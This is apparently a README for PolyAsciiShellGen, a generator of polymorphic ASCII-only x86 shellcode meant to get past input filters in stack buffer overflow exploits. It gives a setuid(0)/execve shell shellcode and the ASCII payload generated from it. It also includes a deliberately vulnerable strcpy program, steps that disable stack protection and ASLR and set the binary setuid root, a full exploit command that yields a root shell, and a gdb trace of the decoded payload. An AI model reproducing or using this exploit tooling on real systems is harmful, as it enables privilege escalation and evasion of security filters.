# PolyAsciiShellGen (x86, 32 bits)
## Polymorphic Ascii Shellcode Generator to bypass MSB data filters for buffer overflow exploits on Intel platforms.

More information about this technique on the Riley "caezar" Eller publication:

[http://julianor.tripod.com/bc/bypass-msb.txt](http://julianor.tripod.com/bc/bypass-msb.txt)


Compile the PolyAsciiShellGen program:

<code>$ make && make clean</code>

Usage:

```
# ./PolyAsciiShellGen
usage: PolyAsciiShellGen <esp offset> <nop sleed factor N * 4 NOPS> <shellcode "\xOP\xOP"...>

```

Example with a setuid(0) & execve(/bin//sh,0,0) shellcode:
```
# ./PolyAsciiShellGen -270 10 "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xcd\x80\x31\xc0\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80"
TX-KKKK-KKKK-xjiiP\%0000%AAAA-9%%%-GJJJP-hhNh-th3%-Q6-5P-yyyZ-yZy6-L6---2-8-P-7KKd-%Kdz-%RkzP-xxxx-GGGx-0AFiP-OOOO-jOwO-iaraP-NN%N-a%%a-q44tP-%SS0-%SL5-7uC%P-FkFF-9pUhP-XXXX-XXXX-PXOFP-AAAj-0w2j-0w-vPPPPPPPPPP

```

Injection in a vulnerable program in a buffer of 512 bytes:
```
#include <string.h>
#include <stdio.h>

int foo(char *str)
{
	char buffer[512];
	printf("[buffer addr] 0x%x: %s\n\n", &buffer, str);
	strcpy(buffer, str);
	return 0;
}


int main(int argc, char *argv[])
{
	if(argc != 2)
		exit(0);
	foo(argv[1]);
}

```

Compile the vulnerable program without security memory protections against the stack buffer overflow exploits:
```
#gcc -fno-pie -fno-stack-protector -z execstack -m32 -g vuln.c -o vuln
```

Set the program with the set-uid root bit, for use all the funtionalities of the shellcode:
```
#chown root:users vuln
#chmod u+s vuln 
#ls -l vuln
-rwsr-xr-x 1 root users 7068 Jul  6 02:37 vuln
```

Deactivate the ASLR:
```
#echo 0 > /proc/sys/kernel/randomize_va_space
```

Injecte the shellcode on the buffer and write the return address:
```
$./vuln "TX-KKKK-KKKK-xjiiP\%0000%AAAA-9%%%-GJJJP-hhNh-th3%-Q6-5P-yyyZ-yZy6-L6---2-8-P-7KKd-%Kdz-%RkzP-xxxx-GGGx-0AFiP-OOOO-jOwO-iaraP-NN%N-a%%a-q44tP-%SS0-%SL5-7uC%P-FkFF-9pUhP-XXXX-XXXX-PXOFP-AAAj-0w2j-0w-vPPPPPPPPPP"$(perl -e 'print "\xd0\xd6\xff\xff"x80')

[buffer addr] 0xffffd6d0: TX-KKKK-KKKK-xjiiP\%0000%AAAA-9%%%-GJJJP-hhNh-th3%-Q6-5P-yyyZ-yZy6-L6---2-8-P-7KKd-%Kdz-%RkzP-xxxx-GGGx-0AFiP-OOOO-jOwO-iaraP-NN%N-a%%a-q44tP-%SS0-%SL5-7uC%P-FkFF-9pUhP-XXXX-XXXX-PXOFP-AAAj-0w2j-0w-vPPPPPPPPPP��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
sh-4.3#whoami
root
```

The debugger view:
```
$gdb -q vuln
(gdb) l
32		char buffer[512];
33	
34		printf("[buffer addr] 0x%x %s\n", &buffer, str);
35	
36		strcpy(buffer, str);
37	
38		return 0;
39	}
40	
41	
(gdb) b 38
Breakpoint 1 at 0x8048493: file vuln.c, line 38.
(gdb)  r "TX-KKKK-KKKK-xjiiP\%0000%AAAA-9%%%-GJJJP-hhNh-th3%-Q6-5P-yyyZ-yZy6-L6---2-8-P-7KKd-%Kdz-%RkzP-xxxx-GGGx-0AFiP-OOOO-jOwO-iaraP-NN%N-a%%a-q44tP-%SS0-%SL5-7uC%P-FkFF-9pUhP-XXXX-XXXX-PXOFP-AAAj-0w2j-0w-vPPPPPPPPP"$(perl -e 'print "\x70\xd6\xff\xff"x80')

...

Breakpoint 1, foo (str=0xffffda00 "") at vuln.c:38
38		return 0;
(gdb) p &buffer
$1 = (char (*)[512]) 0xffffd670
(gdb) nexti
0x08048499	39	}
(gdb) nexti
0xffffd670 in ?? ()
(gdb) p $esp - $eip
$3 = 528
(gdb) x/61i $eip
=> 0xffffd670:	push   esp
   0xffffd671:	pop    eax
   0xffffd672:	sub    eax,0x4b4b4b4b
   0xffffd677:	sub    eax,0x4b4b4b4b
   0xffffd67c:	sub    eax,0x69696a78
   0xffffd681:	push   eax
   0xffffd682:	pop    esp
   0xffffd683:	and    eax,0x30303030
   0xffffd688:	and    eax,0x41414141
   0xffffd68d:	sub    eax,0x25252539
   0xffffd692:	sub    eax,0x4a4a4a47
   0xffffd697:	push   eax
   0xffffd698:	sub    eax,0x684e6868
   0xffffd69d:	sub    eax,0x25336874
   0xffffd6a2:	sub    eax,0x352d3651
   0xffffd6a7:	push   eax
   0xffffd6a8:	sub    eax,0x5a797979
   0xffffd6ad:	sub    eax,0x36795a79
   0xffffd6b2:	sub    eax,0x2d2d364c
   0xffffd6b7:	sub    eax,0x2d382d32
   0xffffd6bc:	push   eax
   0xffffd6bd:	sub    eax,0x644b4b37
   0xffffd6c2:	sub    eax,0x7a644b25
   0xffffd6c7:	sub    eax,0x7a6b5225
   0xffffd6cc:	push   eax
   0xffffd6cd:	sub    eax,0x78787878
   0xffffd6d2:	sub    eax,0x78474747
   0xffffd6d7:	sub    eax,0x69464130
   0xffffd6dc:	push   eax
   0xffffd6dd:	sub    eax,0x4f4f4f4f
   0xffffd6e2:	sub    eax,0x4f774f6a
   0xffffd6e7:	sub    eax,0x61726169
   0xffffd6ec:	push   eax
   0xffffd6ed:	sub    eax,0x4e254e4e
   0xffffd6f2:	sub    eax,0x61252561
   0xffffd6f7:	sub    eax,0x74343471
   0xffffd6fc:	push   eax
   0xffffd6fd:	sub    eax,0x30535325
   0xffffd702:	sub    eax,0x354c5325
   0xffffd707:	sub    eax,0x25437537
   0xffffd70c:	push   eax
   0xffffd70d:	sub    eax,0x46466b46
   0xffffd712:	sub    eax,0x68557039
   0xffffd717:	push   eax
   0xffffd718:	sub    eax,0x58585858
   0xffffd71d:	sub    eax,0x58585858
   0xffffd722:	sub    eax,0x464f5850
   0xffffd727:	push   eax
   0xffffd728:	sub    eax,0x6a414141
   0xffffd72d:	sub    eax,0x6a327730
   0xffffd732:	sub    eax,0x762d7730
   0xffffd737:	push   eax
   0xffffd738:	push   eax
   0xffffd739:	push   eax
   0xffffd73a:	push   eax
   0xffffd73b:	push   eax
   0xffffd73c:	push   eax
   0xffffd73d:	push   eax
   0xffffd73e:	push   eax
   0xffffd73f:	push   eax
   0xffffd740:  push   eax
(gdb)

```


have fun !! 

